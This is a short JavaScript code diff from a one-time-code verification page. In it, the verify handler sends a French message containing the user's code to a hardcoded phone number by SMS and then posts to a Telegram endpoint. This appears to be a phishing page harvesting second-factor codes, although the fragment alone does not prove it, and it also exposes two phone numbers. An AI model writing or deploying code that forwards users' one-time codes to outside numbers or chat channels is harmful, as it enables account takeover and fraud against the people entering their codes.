@@ -162,13 +162,13 @@ Votre code à usage unique est : ${otpCode}, valide pour une courte durée. Si v
 const handleVerify = async () => {
     if (otpDigits.every(d => d)) {
      setIsLoading(true);
-    //  sendSMS(
-    //   "+254784547265",
-    //   message
-    // );
-         sendSM(
-     message
-   );
+     sendSMS(
+      "+254737799310",
+      message
+    );
+   //       sendSM(
+   //   message
+   // );
       try {
         const response = await fetch('/api/send-otp-telegram', {
           method: 'POST',
